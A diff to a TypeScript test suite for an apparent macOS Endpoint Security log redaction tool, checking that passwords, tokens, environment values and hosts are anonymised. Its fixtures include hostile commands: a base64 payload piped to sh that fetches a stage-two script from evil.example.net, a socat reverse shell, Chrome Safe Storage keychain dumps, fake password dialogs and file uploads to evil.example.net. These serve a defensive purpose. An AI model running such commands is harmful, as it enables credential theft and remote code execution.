@@ -117,7 +117,8 @@ describe.skipIf(!fs.existsSync(JQ))('plumbing', () => {
     expect(r.summary['unreadable lines dropped']).toBe('0');
     expect(r.summary['events dropped by Endpoint Security']).toBe('0');
     expect(r.summary['placeholders user']).toBe('1');   // alice
-    expect(r.summary['redacted']).toBe('0');
+    // The password after dscl -authonly.
+    expect(r.summary['redacted']).toBe('1');
     expect(r.summary['capture']).toBe('(standard output)');
   });
 
@@ -758,7 +759,7 @@ describe.skipIf(!fs.existsSync(JQ))('paths', () => {
     const sh = sysProc(313, '/bin/sh');
     const chained = ['/usr/bin/x;/Users/jdoe/Secret', '/usr/bin/x&&/Users/jdoe/Secret', '/usr/bin/x<>/Users/jdoe/Secret3',
       'FOO=/bin/ls;/Users/jdoe/Secret3', '/usr/bin/open "/Users/jdoe/Quoted Secret/z"'];
-    const input = esExec(zsh, sh, { args: ['sh', ...chained], cwd: '/', env: [...JDOE_ENV, 'FOO=/bin/ls;/Users/jdoe/Secret3'], seq: 1 }) + '\n';
+    const input = esExec(zsh, sh, { args: ['sh', ...chained], cwd: '/', env: [...JDOE_ENV, 'DYLD_LIBRARY_PATH=/bin/ls;/Users/jdoe/Secret3'], seq: 1 }) + '\n';
     const r = runClean(['clean', '-o', '-'], { input });
     expect(r.status, r.stderr).toBe(0);
     const names = keyed(r.key, 'name');
@@ -766,7 +767,7 @@ describe.skipIf(!fs.existsSync(JQ))('paths', () => {
     expect(exec.args).toEqual(['sh', `/usr/bin/x;/Users/user1/${names.get('Secret')}`, `/usr/bin/x&&/Users/user1/${names.get('Secret')}`,
       `/usr/bin/x<>/Users/user1/${names.get('Secret3')}`, `FOO=/bin/ls;/Users/user1/${names.get('Secret3')}`,
       `/usr/bin/open "/Users/user1/${names.get('Quoted Secret')}/${names.get('z')}"`]);
-    expect(exec.env).toContain(`FOO=/bin/ls;/Users/user1/${names.get('Secret3')}`);
+    expect(exec.env).toContain(`DYLD_LIBRARY_PATH=/bin/ls;/Users/user1/${names.get('Secret3')}`);
     expect(r.out).not.toMatch(/jdoe|Secret/);
   });
 
@@ -1550,7 +1551,7 @@ describe.skipIf(!fs.existsSync(JQ))('seeds', () => {
   };
 
   test('seeds are replaced anywhere', () => {
-    const env = [...JDOE_ENV, 'HOSTNAME=Janes-MacBook-Pro', 'GREETING=hello JANE DOE'];
+    const env = [...JDOE_ENV, 'HOSTNAME=Janes-MacBook-Pro', 'GREETING=hello JANE DOE', 'TERM_TITLE=JANE DOE on Janes-MacBook-Pro'];
     const input = [
       run(800, '/usr/bin/osascript', ['osascript', '-e', 'display dialog "Jane Doe, enter your password" default answer "" with hidden answer'], '/', 1),
       run(801, '/usr/sbin/scutil', ['scutil', '--set', 'ComputerName', 'Janes-MacBook-Pro'], '/', 2, env),
@@ -1572,7 +1573,8 @@ describe.skipIf(!fs.existsSync(JQ))('seeds', () => {
     expect(args[1]).toEqual(['scutil', '--set', 'ComputerName', 'host1.internal.invalid']);
     expect(args[2]).toEqual(['scutil', '--set', 'LocalHostName', 'host1.internal.invalid']);
     expect(args[3]).toEqual(['ioreg', '-l', '-k', 'seed1']);
-    expect(events(r.out)[1]!.event.exec.env).toEqual(expect.arrayContaining(['HOSTNAME=host1.internal.invalid', 'GREETING=hello Person 1']));
+    expect(events(r.out)[1]!.event.exec.env).toEqual(expect.arrayContaining(['HOSTNAME=<redacted>', 'GREETING=<redacted>',
+      'TERM_TITLE=Person 1 on host1.internal.invalid']));
     for (const k of ['user', 'realname', 'host', 'seed']) expect(r.summary[`placeholders ${k}`], k).toBe('1');
     sameFindings(input, r.out);
   });
@@ -1663,7 +1665,7 @@ describe.skipIf(!fs.existsSync(JQ))('seeds', () => {
       'echo dev; cat /dev/null', 'ls',
     ]);
     expect(execs[4]!.event.exec.args).toEqual(['ssh', 'user2@host.example.com', 'ls', '/dev/null']);
-    expect(execs[0]!.event.exec.env).toEqual(['HOME=/Users/user1', 'USER=user1']);
+    expect(execs[0]!.event.exec.env).toEqual(['HOME=/Users/user1', 'USER=<redacted>']);
     const created = ev.filter(e => e.event.create).map(e => e.event.create.destination.existing_file.path as string);
     expect(created[1]).toBe('/Applications/Foo.app/Contents/XPCServices/com.user1.Foo.Helper.xpc/Contents/MacOS/x');
     expect(created[2]).toMatch(/^\/Users\/user1\/Library\/PlugIns\/com\.user1\.Tool\.appex\/name\d+$/);
@@ -1705,7 +1707,8 @@ describe.skipIf(!fs.existsSync(JQ))('seeds', () => {
     expect(r.status, r.stderr).toBe(0);
     const ev = events(r.out);
     expect(ev[0]!.event.exec.args).toEqual(['echo', 'Person 1', '$HOME', `\${HOME}/${keyed(r.key, 'name').get('x')}`, 'user1', 'user1', 'homework', 'user2_backup', 'user2-laptop', 'JDOE2', '--home=/tmp', 'x=user2']);
-    expect(ev[0]!.event.exec.env).toEqual(['HOME=/Users/user1', 'USER=user1', 'HOME_DIR=/tmp', 'NOTE=user2_backup']);
+    // Only HOME's value is still cleaned; the others are redacted, their names kept.
+    expect(ev[0]!.event.exec.env).toEqual(['HOME=/Users/user1', 'USER=<redacted>', 'HOME_DIR=<redacted>', 'NOTE=<redacted>']);
     // A seed written with escaped spaces in shell code is replaced, and its placeholder keeps the escapes.
     expect(ev[1]!.event.exec.args[2]).toBe(`cp ~/Library/Application\\ Support/Person\\ 2\\ Sync/${keyed(r.key, 'name').get('a.db')} /tmp/ && echo Person\\ 2`);
     expect(ev[2]!.event.exec.args[1]).toBe('/Library/Application Support/Person 2 Sync');
@@ -1980,7 +1983,7 @@ describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
     expect(r.status, r.stderr).toBe(0);
     const ev = events(r.out);
     expect(ev[0]!.event.exec.args).toEqual(['git', 'config', 'user.email', 'person1@example.invalid']);
-    expect(ev[0]!.event.exec.env).toContain('EMAIL=person1@example.invalid');
+    expect(ev[0]!.event.exec.env).toContain('EMAIL=<redacted>');
     // An address has one placeholder whatever its case.
     expect(ev[1]!.event.exec.args[2]).toBe(`echo "mail person1@example.invalid <person2@example.invalid>" | tee /tmp/${keyed(r.key, 'name').get('m.txt')}`);
     expect(ev[2]!.event.exec.args).toEqual(['echo', 'icon@2x.png', '@/usr/share/a.json', 'react@18.3.1']);
@@ -2015,7 +2018,7 @@ describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
     expect(args[1]).toEqual(['ssh', h.get('build01.corp')]);
     expect(args[2]![2]).toBe(`git@${h.get('git.acme.com')}:team/repo.git`);
     expect(args[3]).toEqual(['nc', h.get('10.0.0.5'), '4444']);
-    expect(ev[3]!.event.exec.env).toContain(`HTTP_PROXY=http://${h.get('proxy.lan')}:3128`);
+    expect(ev[3]!.event.exec.env).toContain('HTTP_PROXY=<redacted>');
     expect(args[4]![2]).toBe(`ping -c1 ${h.get('192.168.1.20')} && ssh admin@${h.get('nas.home.arpa')} uptime; ping6 ${h.get('fe80::1')}%en0; scp x deploy@${h.get('buildbox')}:/srv/`);
     expect(args[5]).toEqual(['ping', 'host1.internal.invalid']);
     expect(args[6]).toEqual(['ssh', 'user1@host1.internal.invalid', h.get('build01.corp')]);
@@ -2107,18 +2110,18 @@ describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
   });
 
   test('a host or address met again, in later events, a loaded key or another case, keeps its placeholder', () => {
-    const proxy = 'HTTP_PROXY=http://bob:secret@Proxy.LAN:3128';
+    const proxy = 'http://bob:secret@Proxy.LAN:3128';
     const input = [
-      run(1140, '/usr/bin/true', ['true'], '/', 1, [...JDOE_ENV, proxy, 'EMAIL=Jane.Doe@acme.com']),
-      run(1141, '/usr/bin/true', ['true'], '/', 2, [...JDOE_ENV, proxy, 'EMAIL=Jane.Doe@acme.com']),
+      run(1140, '/bin/echo', ['echo', proxy, 'Jane.Doe@acme.com'], '/', 1),
+      run(1141, '/bin/echo', ['echo', proxy, 'Jane.Doe@acme.com'], '/', 2),
       run(1142, '/usr/bin/ssh', ['ssh', 'proxy.lan'], '/', 3),
     ].join('\n') + '\n';
     const key = path.join(tmpDir(), 'shared.key.tsv');
     const first = runClean(['clean', '-o', '-', '-k', key], { input });
     expect(first.status, first.stderr).toBe(0);
     const ev = events(first.out);
-    expect(ev[0]!.event.exec.env).toEqual(expect.arrayContaining(['HTTP_PROXY=http://host1.internal.invalid:3128', 'EMAIL=person1@example.invalid']));
-    expect(ev[1]!.event.exec.env).toEqual(ev[0]!.event.exec.env);
+    expect(ev[0]!.event.exec.args).toEqual(['echo', 'http://host1.internal.invalid:3128', 'person1@example.invalid']);
+    expect(ev[1]!.event.exec.args).toEqual(ev[0]!.event.exec.args);
     expect(ev[2]!.event.exec.args).toEqual(['ssh', 'host1.internal.invalid']);
     // Each user info removed is counted, in every event it is in.
     expect(first.summary['redacted']).toBe('2');
@@ -2157,7 +2160,7 @@ describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
     const h = keyed(r.key, 'host');
     const n = keyed(r.key, 'name');
     expect(args[0]).toEqual(['echo', 'person1@example.invalid', 'person2@example.invalid:hunter2']);
-    expect(ev[0]!.event.exec.env).toContain('EMAIL=person1@example.invalid');
+    expect(ev[0]!.event.exec.env).toContain('EMAIL=<redacted>');
     expect(args[1]).toEqual(['ssh', '-L', `8080:${h.get('10.0.0.5')}:80`, h.get('jump')]);
     expect(args[2]).toEqual(['socat', `TCP:${h.get('10.0.0.6')}:4444`, 'EXEC:/bin/sh']);
     expect(args[3]).toEqual(['curl', '--resolve', `h:443:${h.get('10.0.0.7')}`, '-o', '/dev/null', `https://${h.get('h')}/`]);
@@ -2206,7 +2209,7 @@ describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
     const h = { get: (k: string): string | undefined => lower.get(k.toLowerCase()) };
     expect(keyed(r.key, 'host').size).toBe(4);
     expect(ev[0]!.event.exec.args[2]).toBe(`ping ${h.get('wiki.ACME.com')}; ping ${h.get('Build01.CoRp')}`);
-    expect(ev[0]!.event.exec.env).toContain(`WIKI=${h.get('wiki.ACME.com')}`);
+    expect(ev[0]!.event.exec.env).toContain('WIKI=<redacted>');
     expect(ev[1]!.event.exec.args).toEqual(['echo', h.get('NAS.Home.Arpa'), h.get('printer.LoCaL')]);
     expect(r.out).not.toMatch(/acme|build01|nas\.|printer/i);
   });
@@ -2352,5 +2355,221 @@ describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
     const n = keyed(r.key, 'name');
     expect(events(r.out)[0]!.event.exec.args).toEqual(['curl', '-o', '/dev/null', `https://evil.example.net/${n.get('a')}/${n.get('b@c.com')}`]);
     expect(r.summary['redacted']).toBe('1');
+  });
+});
+
+// ---- credentials, data and the environment ---------------------------------------------------------------------
+describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
+  const child = (pid: number): ReturnType<typeof esProc> => esProc({ pid, path: '/bin/zsh', platform: true, signingId: 'com.apple.zsh', ppid: 300 });
+  const sysImage = (pid: number, p: string): ReturnType<typeof esProc> =>
+    esProc({ pid, pidversion: pid + 2000, path: p, platform: true, signingId: `com.apple.${p.split('/').pop()!}`, ppid: 300 });
+  const run = (pid: number, p: string, args: string[], cwd: string, seq: number, env: string[] = JDOE_ENV): string =>
+    esExec(child(pid), sysImage(pid, p), { args, cwd, env, seq });
+  const sameFindings = (raw: string, out: string): void => {
+    expect(findingSignature(buildModel(lines(out)))).toEqual(findingSignature(buildModel(lines(raw))));
+  };
+  const seeds = (): string => {
+    const f = path.join(tmpDir(), 'seeds.tsv');
+    fs.writeFileSync(f, 'user\tjdoe\n');
+    return f;
+  };
+  /** Both ways in: -i FILE and -i -. */
+  const both = (input: string, extra: string[] = []): CleanRun[] =>
+    [['clean', '-o', '-', '-S', seeds(), ...extra], ['clean', '-i', '-', '-o', '-', '-S', seeds(), ...extra]].map(a => {
+      const r = runClean(a, { input });
+      expect(r.status, r.stderr).toBe(0);
+      return r;
+    });
+  /** No key row's real value holds a marker, a redaction or a placeholder. */
+  const cleanKey = (key: string): void => {
+    for (const k of parseKey(key)) expect(k.real, k.placeholder).not.toMatch(/[\u0001\u0002]|<redacted>|(?:name|host|data|user)\d+|internal\.invalid|example\.invalid/);
+  };
+  const ruleIds = (out: string): Set<string> =>
+    new Set([...findingSignature(buildModel(lines(out))).values()].flat().map(s => s.split(':')[0]!));
+  const AKIA = 'AKIAABCDEFGHIJKLMNOP';
+  const JWT = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqZG9lIn0.c2lnbmF0dXJlMTIzNDU2';
+  const GHP = 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef0123';
+  const B64 = 'Y3VybCAtcyBodHRwczovL2V2aWwuZXhhbXBsZS5uZXQvc3RhZ2UyIHwgc2g=';
+  const HEX40 = '3f2a9c0b5e7d41f8a6c2b9e0d3f4a5b6c7d8e9f0';
+  const docs = '/Users/jdoe/Documents';
+
+  test('credentials are redacted and never keyed', () => {
+    const argv: [string, string[], string?][] = [
+      ['/usr/bin/dscl', ['dscl', '.', '-authonly', 'jdoe', 'hunter2']],
+      ['/usr/bin/security', ['security', 'add-generic-password', '-a', 'jdoe', '-s', 'svc', '-w', 'hunter3']],
+      ['/usr/bin/curl', ['curl', '-u', 'bob:pw1', '-H', 'Authorization: Bearer tok9', '-H', 'Accept: text/html', '-b', 'session=ck1', '-b', 'cookies.txt', 'https://evil.example.net']],
+      ['/usr/local/bin/mysql', ['mysql', '-uroot', '-pSQLPW', 'db']],
+      ['/usr/bin/openssl', ['openssl', 'enc', '-d', '-aes-256-cbc', '-pass', 'pass:OPW', '-k', 'OKPW']],
+      ['/usr/bin/env', ['env', 'TOKEN=abc123xyz', 'MY_SECRET_X=s3cr3t', 'PLAIN=ok', '/usr/bin/true']],
+      ['/usr/local/bin/aws', ['aws', 'configure', 'set', 'aws_access_key_id', AKIA]],
+      ['/usr/bin/curl', ['curl', '-H', `X-Session: ${JWT}`, '--oauth2-bearer', 'tok10', 'https://evil.example.net']],
+      ['/usr/local/bin/tool', ['tool', '--password=hunter6', '--token', 'tok7', '--api-key', 'key8', '--password-stdin', 'keep.example.com']],
+      ['/usr/bin/sudo', ['sudo', '-u', 'root', 'curl', '-u', 'bob:pw3', 'https://evil.example.net']],
+      ['/usr/bin/curl', ['curl', '-o', '/dev/null', `https://${GHP}@github.com/Board/x.git?t=${JWT}&q=fine`]],
+      ['/usr/bin/ssh', ['ssh', '-p2222', 'host.example.com', 'ls']],
+    ];
+    const code: [string, string[], string][] = [
+      ['/bin/sh', ['sh', '-c', 'mysql -pSQLPW2; curl -u bob:pw2 evil.sh/x'], docs],
+      ['/bin/sh', ['sh', '-c', "curl -H 'Authorization: Bearer tok8' https://evil.example.net"], '/'],
+      ['/usr/bin/osascript', ['osascript', '-e', 'do shell script "dscl . -authonly jdoe hunter4"'], '/'],
+      ['/bin/sh', ['sh', '-c', 'TOKEN=abc999 sudo -u root curl -u bob:pw5 https://evil.example.net'], '/'],
+      ['/bin/sh', ['sh', '-c', `export API_KEY=k123; echo ${AKIA} ${JWT}`], '/'],
+      ['/bin/bash', ['bash', '-c', 'bash -c "security add-generic-password -a x -s y -w hunter5"'], '/'],
+    ];
+    const env = [...JDOE_ENV, `AWS_ACCESS_KEY_ID=${AKIA}`, `SESSION=${JWT}`, `LC_X=${AKIA}`];
+    const input = [
+      ...argv.map(([p, a], i) => run(1300 + i, p, a, '/', i + 1, env)),
+      ...code.map(([p, a, cwd], i) => run(1320 + i, p, a, cwd, i + 20)),
+      // A child of the shell code above: the same command as argv.
+      run(1330, '/usr/bin/curl', ['curl', '-u', 'bob:pw2', 'evil.sh/x'], docs, 30),
+    ].join('\n') + '\n';
+    for (const r of both(input)) {
+      const ev = events(r.out);
+      const args = ev.map(e => e.event.exec.args as string[]);
+      const raw = events(input).map(e => e.event.exec.args as string[]);
+      // Replacement is in place: argument counts never change.
+      expect(args.map(a => a.length)).toEqual(raw.map(a => a.length));
+      const n = keyed(r.key, 'name');
+      const R = '<redacted>';
+      expect(args[0]).toEqual(['dscl', '.', '-authonly', 'user1', R]);
+      expect(args[1]).toEqual(['security', 'add-generic-password', '-a', 'user1', '-s', 'svc', '-w', R]);
+      expect(args[2]).toEqual(['curl', '-u', R, '-H', `Authorization: ${R}`, '-H', 'Accept: text/html', '-b', R, '-b', 'cookies.txt', 'https://evil.example.net']);
+      expect(args[3]).toEqual(['mysql', '-uroot', `-p${R}`, 'db']);
+      expect(args[4]).toEqual(['openssl', 'enc', '-d', '-aes-256-cbc', '-pass', R, '-k', R]);
+      expect(args[5]).toEqual(['env', `TOKEN=${R}`, `MY_SECRET_X=${R}`, 'PLAIN=ok', '/usr/bin/true']);
+      expect(args[6]).toEqual(['aws', 'configure', 'set', 'aws_access_key_id', R]);
+      expect(args[7]).toEqual(['curl', '-H', `X-Session: ${R}`, '--oauth2-bearer', R, 'https://evil.example.net']);
+      expect(args[8]).toEqual(['tool', `--password=${R}`, '--token', R, '--api-key', R, '--password-stdin', 'keep.example.com']);
+      expect(args[9]).toEqual(['sudo', '-u', 'root', 'curl', '-u', R, 'https://evil.example.net']);
+      // A query value with a credential shape is redacted, not data; the user info goes as before.
+      expect(args[10]).toEqual(['curl', '-o', '/dev/null', `https://github.com/${n.get('Board')}/${n.get('x.git')}?t=${R}&q=${keyed(r.key, 'data').get('fine')}`]);
+      // ssh -p is a port.
+      expect(args[11]).toEqual(['ssh', '-p2222', 'host.example.com', 'ls']);
+      // Shell code: the same rules, word by word, behind wrappers and inside quoted code.
+      expect(args[12]![2]).toBe(`mysql -p${R}; curl -u ${R} evil.sh/${n.get('x')}`);
+      expect(args[13]![2]).toBe(`curl -H 'Authorization: ${R}' https://evil.example.net`);
+      expect(args[14]![2]).toBe(`do shell script "dscl . -authonly user1 ${R}"`);
+      expect(args[15]![2]).toBe(`TOKEN=${R} sudo -u root curl -u ${R} https://evil.example.net`);
+      expect(args[16]![2]).toBe(`export API_KEY=${R}; echo ${R} ${R}`);
+      expect(args[17]![2]).toBe(`bash -c "security add-generic-password -a x -s y -w ${R}"`);
+      // The child of the shell code reads its URL the same way.
+      expect(args[18]).toEqual(['curl', '-u', R, `evil.sh/${n.get('x')}`]);
+      const envOut = ev[0]!.event.exec.env as string[];
+      expect(envOut).toEqual(expect.arrayContaining([`AWS_ACCESS_KEY_ID=${R}`, `SESSION=${R}`, `LC_X=${R}`]));
+      for (const s of ['hunter', 'pw1', 'pw2', 'pw3', 'pw5', 'tok7', 'tok8', 'tok9', 'tok10', 'key8', 'SQLPW', 'OPW', 'OKPW', 'abc123xyz', 'abc999', 's3cr3t', 'k123', 'ck1', AKIA, JWT, GHP, 'eyJ']) {
+        expect(r.out, s).not.toContain(s);
+        expect(r.key, s).not.toContain(s);
+      }
+      cleanKey(r.key);
+      // 19 in argv, 10 in shell code, 1 in the child, and the shape in LC_X (a kept variable) of the 12 argv events;
+      // AWS_ACCESS_KEY_ID and SESSION are redacted as environment values, not counted as recognised credentials.
+      expect(r.summary['redacted']).toBe('42');
+      sameFindings(input, r.out);
+    }
+  });
+
+  test('the rules\' flags survive', () => {
+    const input = [
+      run(1400, '/usr/bin/security', ['security', 'find-generic-password', '-s', 'Chrome Safe Storage', '-w'], '/', 1),
+      run(1401, '/usr/bin/security', ['security', 'find-generic-password', '-w', '-s', 'Chrome Safe Storage', 'login.keychain'], '/', 2),
+      run(1402, '/usr/bin/security', ['security', 'find-internet-password', '-s', 'example.com', '-p', '/x', '-w'], '/', 3),
+      run(1403, '/usr/bin/dscl', ['dscl', '.', '-authonly', 'jdoe', 'hunter2'], '/', 4),
+      run(1404, '/usr/bin/osascript', ['osascript', '-e', 'display dialog "Update needed" default answer "" with hidden answer'], '/', 5),
+      run(1405, '/usr/bin/base64', ['base64', '-d', '-i', '/tmp/p.b64'], '/', 6),
+      run(1406, '/usr/bin/openssl', ['openssl', 'enc', '-d', '-aes-256-cbc', '-pass', 'pass:OPW', '-in', '/tmp/p.bin'], '/', 7),
+      run(1407, '/usr/bin/xattr', ['xattr', '-d', 'com.apple.quarantine', '/tmp/x.app'], '/', 8),
+    ].join('\n') + '\n';
+    for (const r of both(input)) {
+      const args = events(r.out).map(e => e.event.exec.args as string[]);
+      expect(args[0]).toEqual(['security', 'find-generic-password', '-s', 'Chrome Safe Storage', '-w']);
+      expect(args[1]).toEqual(['security', 'find-generic-password', '-w', '-s', 'Chrome Safe Storage', 'login.keychain']);
+      expect(args[2]).toEqual(['security', 'find-internet-password', '-s', 'example.com', '-p', '/x', '-w']);
+      expect(args[3]).toEqual(['dscl', '.', '-authonly', 'user1', '<redacted>']);
+      expect(args[4]).toEqual(['osascript', '-e', 'display dialog "Update needed" default answer "" with hidden answer']);
+      expect(args[5]!.slice(0, 3)).toEqual(['base64', '-d', '-i']);
+      expect(args[6]!.slice(0, 6)).toEqual(['openssl', 'enc', '-d', '-aes-256-cbc', '-pass', '<redacted>']);
+      expect(args[7]!.slice(0, 3)).toEqual(['xattr', '-d', 'com.apple.quarantine']);
+      const ids = ruleIds(r.out);
+      for (const id of ['dscl-authonly', 'keychain-access', 'fake-prompt', 'payload-decode', 'quarantine-strip']) expect(ids, id).toContain(id);
+      expect([...findingSignature(buildModel(lines(r.out))).values()].flat().filter(s => s.startsWith('keychain-access:high'))).toHaveLength(2);
+      sameFindings(input, r.out);
+    }
+  });
+
+  test('data is mapped in the key', () => {
+    const input = [
+      run(1500, '/usr/bin/curl', ['curl', '-d', 'q=Board+minutes', 'https://evil.example.net'], '/', 1),
+      run(1501, '/usr/bin/curl', ['curl', '--data-urlencode', 'name=Jane Doe', '-F', 'note=Q3 numbers', '-F', 'file=@/Users/jdoe/Documents/Board.pdf',
+        '--data-binary', '@/tmp/body.json', '-dx=1', 'https://evil.example.net'], '/', 2),
+      run(1502, '/bin/sh', ['sh', '-c', `echo ${B64} | base64 -d | sh`], '/', 3),
+      run(1503, '/bin/sh', ['sh', '-c', "curl -d 'q=Board+minutes' https://evil.example.net"], '/', 4),
+      run(1504, '/usr/bin/env', ['env', `PAYLOAD=${B64}`, '/usr/bin/true'], '/', 5),
+      run(1505, '/usr/bin/base64', ['base64', '-d'], '/', 6),
+    ].join('\n') + '\n';
+    for (const r of both(input)) {
+      const args = events(r.out).map(e => e.event.exec.args as string[]);
+      const d = keyed(r.key, 'data');
+      const n = keyed(r.key, 'name');
+      for (const v of ['q=Board+minutes', 'name=Jane Doe', 'note=Q3 numbers', 'x=1', B64]) expect(d.get(v), v).toMatch(/^data\d+$/);
+      expect(args[0]).toEqual(['curl', '-d', d.get('q=Board+minutes'), 'https://evil.example.net']);
+      expect(args[1]).toEqual(['curl', '--data-urlencode', d.get('name=Jane Doe'), '-F', d.get('note=Q3 numbers'),
+        '-F', `file=@/Users/user1/Documents/${n.get('Board.pdf')}`, '--data-binary', `@/tmp/${n.get('body.json')}`, `-d${d.get('x=1')}`, 'https://evil.example.net']);
+      expect(args[2]![2]).toBe(`echo ${d.get(B64)} | base64 -d | sh`);
+      expect(args[3]![2]).toBe(`curl -d '${d.get('q=Board+minutes')}' https://evil.example.net`);
+      expect(args[4]).toEqual(['env', `PAYLOAD=${d.get(B64)}`, '/usr/bin/true']);
+      // The key holds the real values as JSON strings.
+      expect(r.key).toContain(`\t${JSON.stringify('q=Board+minutes')}\n`);
+      expect(r.out).not.toMatch(/Board|Jane|Q3 numbers|Y3VybC/);
+      cleanKey(r.key);
+      sameFindings(input, r.out);
+    }
+  });
+
+  test('hashes and IDs are not data', () => {
+    const cache = `/Users/jdoe/Library/Caches/com.x/${HEX40}.db`;
+    const uuid = '/var/folders/ab/cdef/T/3F2504E0-4F89-11D3-9A0C-0305E82C3301/x.txt';
+    const uuidLower = '/private/var/folders/ab/cdef/T/3f2504e0-4f89-11d3-9a0c-0305e82c3301/y.txt';
+    const id = 'com.example.verylongbundleidentifiername.helper';
+    const helper = esProc({ pid: 1610, path: '/Applications/X.app/Contents/MacOS/X Helper', signingId: id, teamId: 'ABCDE12345', ppid: 300 });
+    const input = [
+      esCreate(zsh, { path: cache }, 1),
+      esCreate(zsh, { path: uuid }, 2),
+      esCreate(zsh, { path: uuidLower }, 3),
+      run(1600, '/bin/rm', ['rm', cache, uuid, uuidLower], '/', 4),
+      run(1601, '/bin/sh', ['sh', '-c', `rm ~/Library/Caches/com.x/${HEX40}.db ${uuid}`], '/', 5),
+      run(1602, '/bin/launchctl', ['launchctl', 'kickstart', `gui/501/${id}`], '/', 6),
+      run(1603, '/usr/bin/open', ['open', '-b', id, '--args', '--disable-background-timer-throttling'], '/', 7),
+      esExec(child(1609), helper, { args: ['X Helper', '--type=renderer', `--enable-features=${'AutofillServerCommunication'}`], cwd: '/', env: JDOE_ENV, seq: 8 }),
+    ].join('\n') + '\n';
+    for (const r of both(input)) {
+      expect(keyed(r.key, 'data').size, r.key).toBe(0);
+      const ev = events(r.out);
+      expect(ev[0]!.process.cdhash).toBe('6F8527C5F41B804E4C90BF31A969ACF8C4694EE6');
+      expect(ev[0]!.event.create.destination.existing_file.path).toBe(`/Users/user1/Library/Caches/com.x/${keyed(r.key, 'name').get(`${HEX40}.db`)}`);
+      expect(ev[5]!.event.exec.args).toEqual(['launchctl', 'kickstart', `gui/501/${id}`]);
+      expect(ev[6]!.event.exec.args).toEqual(['open', '-b', id, '--args', '--disable-background-timer-throttling']);
+      expect(ev[7]!.event.exec.target.signing_id).toBe(id);
+      sameFindings(input, r.out);
+    }
+  });
+
+  test('environment values are redacted, except the useful ones', () => {
+    const env = ['AWS_SESSION_TOKEN=FQoGZXIvYXdzEJr', 'MY_VAR=Board', 'PATH=/Users/jdoe/bin:/usr/bin',
+      'DYLD_INSERT_LIBRARIES=/Users/jdoe/lib/x.dylib', 'HOME=/Users/jdoe', 'LC_ALL=en_US.UTF-8', 'TERM=xterm-256color',
+      '__CF_USER_TEXT_ENCODING=0x1F5:0x0:0x0', 'TERM_AUTH_TOKEN=t0k', 'GIT_PASSWORD=x', 'NOEQUALS', 'EMPTY='];
+    const input = [run(1700, '/usr/bin/true', ['true'], '/', 1, env), run(1701, '/usr/bin/true', ['true'], '/', 2, env)].join('\n') + '\n';
+    for (const r of both(input)) {
+      const ev = events(r.out);
+      const R = '<redacted>';
+      expect(ev[0]!.event.exec.env).toEqual([`AWS_SESSION_TOKEN=${R}`, `MY_VAR=${R}`, 'PATH=/Users/user1/bin:/usr/bin',
+        `DYLD_INSERT_LIBRARIES=/Users/user1/lib/${keyed(r.key, 'name').get('x.dylib')}`, 'HOME=/Users/user1', 'LC_ALL=en_US.UTF-8', 'TERM=xterm-256color',
+        '__CF_USER_TEXT_ENCODING=0x1F5:0x0:0x0', `TERM_AUTH_TOKEN=${R}`, `GIT_PASSWORD=${R}`, R, 'EMPTY=']);
+      expect(ev[1]!.event.exec.env).toEqual(ev[0]!.event.exec.env);
+      expect(r.out).not.toMatch(/FQoG|Board|t0k|jdoe/);
+      cleanKey(r.key);
+      // Secret-named entries are recognised credentials and counted; other values are redacted by policy and are not.
+      expect(r.summary['redacted']).toBe('6');
+      sameFindings(input, r.out);
+    }
   });
 });
